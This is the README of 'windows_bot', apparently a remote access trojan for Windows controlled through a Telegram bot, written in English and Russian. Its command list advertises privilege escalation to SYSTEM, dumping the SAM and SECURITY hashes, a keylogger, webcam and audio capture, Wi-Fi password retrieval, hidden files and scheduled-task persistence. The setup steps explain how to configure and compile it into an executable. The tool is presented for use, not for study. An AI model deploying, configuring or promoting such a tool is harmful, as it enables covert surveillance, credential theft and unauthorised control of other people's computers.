# 🌟 Windows Bot


<br><br>


```
Core Commands
=============

    Command                   Description
    -------                   -----------   
    author                    Information about creator of this project                                         
    help                      Help menu
    repeat                    Repeat command
    session                   About this session
    getpid                    Current pid
    getuid                    Current user
    getsystem                 Get SYSTEM rights
    config                    Bot config control
    account                   Control accounts connected to this computer
    autostart                 Bot autostart   
    restart                   Restart bot    
    exit                      Log out of this session
                 

File System Commands 
====================

    Command                   Description
    -------                   -----------                                                                                                                                                        
    pwd                       Get working directory
    cd                        Change directory         
    ls                        Get information about files or dirs in working directory    
    mkfile                    Create file               
    mkdir                     Create dir              
    rn                        Rename file or dir
    rm                        Delete file 
    rmdir                     Delete dir                          
    cp                        Copy file or dir
    mv                        Move file or dir
    hide                      Hide file or dir 
    unhide                    Unhide file or dir                        
    cat                       Download file
    zip                       Make archive current directory
                 
                 
Networking Commands
===================

    Command                   Description
    -------                   -----------         
    inet                      Enable or disable Internet
    ipconfig                  Get network interfaces     
    route                     Get routing table
    arp                       Get host ARP cache                                                                                     
    netstat                   Get network connections
    wifi                      Find Wi-Fi or get Wi-Fi password
    site                      Website utilities

                                 
System Commands                                                    
===============

    Command                   Description
    -------                   -----------      
    device                    Device utilities                                                                            
    systeminfo                Get information about computer  
    dxdiag                    Get information about computer using dxdiag
    reg                       Registry utilities  
    gpedit                    Local Group Policy utilities  
    service                   Service utilities 
    task                      Task utilities 
    startup                   Startup utilities   
    app                       App utilities    
    env                       Environment utilities
    lang                      Language utilities
    user                      User utilities                 
    ps                        Get information about running processes 
    kill                      Terminate process    
    run                       Launch file     
    cmd                       Execute command in cmd   
    powershell                Execute command in powershell   
    eventlog                  Get events from the eventlog      
    time                      Get current time or change current time   
    date                      Get current date or change current date   
    logout                    User logout
    hibernate                 Hibernate computer
    sleep                     Sleep computer
    reboot                    Reboot computer         
    shutdown                  Shutdown computer       

                 
User Interface Commands                                                  
=======================

    Command                   Description
    -------                   -----------
    hashpass                  Dump contents of SAM and SECURITY and SYSTEM database
    mouse                     Mouse utilities         
    keyboard                  Keyboard utilities                                                                                                                                       
    clipboard                 Clipboard utilities                    
    screen                    Screen utilities
    webcam                    Take screenshot of webcam
    audio                     Record audio or play audio 
    img                       Display image
    msg                       Display message                     
    keylogger                 Keylogger utilities     
```


<br><br>


## en

<br>

windows_bot — Provide full remote access to the system

<br>

## 🚀 Features

- ✅ Ease of use
- ⚙️ Extensive functionality
- 📦 Can be compiled into .exe

<br>

## 🧰 Installation

``` bash
# Clone the repository
git clone https://github.com/cppandpython/windows_bot.git

# Change consts ​​in bot.py
TOKEN = TELEGRAM BOT TOKEN
PASSWORD = PASSWORD FOR SESSION WITH TELEGRAM BOT
SEED = ACCEPTABLE VALUE TYPE int & RESPONSIBLE FOR ENCRYPTION INITIAL VALUES  
PATH = PATH TO SAVE TELEGRAM BOT

BOT_FILE_NAME = HOW TO SAVE TELEGRAM BOT NAME IN PATH
BOT_TASK_NAME = TASK NAME IN SCHEDULE FOR TELEGRAM BOT & NECESSARY IF BOT_EXE IS True
BOT_TASK_DESCRIPTION = TASK DESCRIPTION IN SCHEDULE FOR TELEGRAM BOT & NECESSARY IF BOT_EXE IS True
BOT_EXE = TELEGRAM BOT WILL BE LAUNCHED IN (EXE IF BOT_EXE == True ELSE PYTHON) MODE

# Launch
pip install -r requirements.txt
python bot.py
```


<br><br><br>


## ru

<br>

windows_bot — Обеспечивает полный удаленный доступ к системе

<br>

## 🚀 Функции

- ✅ Простота использования
- ⚙️ Большая функциональность
- 📦 Можно скомпилировать в .exe

<br>

## 🧰 Установка

```bash
# Клонируй репозиторий
git clone https://github.com/cppandpython/windows_bot.git

# Изменить константы в bot.py
TOKEN = ТОКЕН TELEGRAM-БОТА
PASSWORD = ПАРОЛЬ ДЛЯ СЕССИИ С TELEGRAM-БОТОМ
SEED = ДОПУСТИМОЕ ЗНАЧЕНИЕ ШИФРОВАНИЯ TELEGRAM-БОТА ТИП int & ОТВЕТСТВЕННЫЙ ЗА НАЧАЛЬНЫЕ ЗНАЧЕНИЯ ШИФРОВАНИЯ  
PATH = ПУТЬ ДЛЯ СОХРАНЕНИЯ TELEGRAM-БОТА

BOT_FILE_NAME = ИМЯ ФАЙЛА TELEGRAM-БОТА ДЛЯ СОХРАНЕНИЯ В PATH
BOT_TASK_NAME = ИМЯ ЗАДАЧИ В ПЛАНИРОВЩИКЕ ДЛЯ TELEGRAM-БОТА & НЕОБХОДИМО ЕСЛИ BOT_EXE ЯВЛЯЕТСЯ True
BOT_TASK_DESCRIPTION = ОПИСАНИЕ ЗАДАЧИ В ПЛАНИРОВЩИКЕ ДЛЯ TELEGRAM-БОТА & НЕОБХОДИМО ЕСЛИ BOT_EXE ЯВЛЯЕТСЯ True
BOT_EXE = TELEGRAM-БОТ БУДЕТ ЗАПУЩЕН В РЕЖИМЕ (EXE ЕСЛИ BOT_EXE == True ИНАЧЕ PYTHON)

# Запуск
pip install -r requirements.txt
python bot.py
```
